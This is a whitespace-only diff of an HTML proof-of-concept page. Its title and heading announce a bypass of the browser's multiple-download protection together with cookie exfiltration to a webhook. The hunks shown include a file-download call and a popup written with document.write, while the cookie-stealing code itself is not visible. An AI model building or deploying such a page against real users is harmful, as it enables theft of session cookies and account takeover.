@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="id">
-
 <head>
     <meta charset="UTF-8">
     <title>Bypass Multiple Download PoC</title>
@@ -11,7 +10,6 @@
             margin: 50px auto;
             text-align: center;
         }
-
         button {
             padding: 12px 24px;
             background: #d93025;
@@ -24,7 +22,6 @@
         }
     </style>
 </head>
-
 <body>
     <h2>Bypass Multiple Download + Cookie Exfiltration</h2>
     <p>Klik tombol untuk download 2 file & kirim cookie ke webhook.</p>
@@ -70,7 +67,7 @@
             downloadFile('file_pertama.txt', 'Halo, ini isi file teks sederhana.\nBaris kedua di sini.');
 
             const newWin = window.open('', '_blank');
-
+            
             if (newWin) {
                 newWin.document.write(`
                     <html><body>
@@ -104,5 +101,4 @@
         }
     </script>
 </body>
-
 </html>
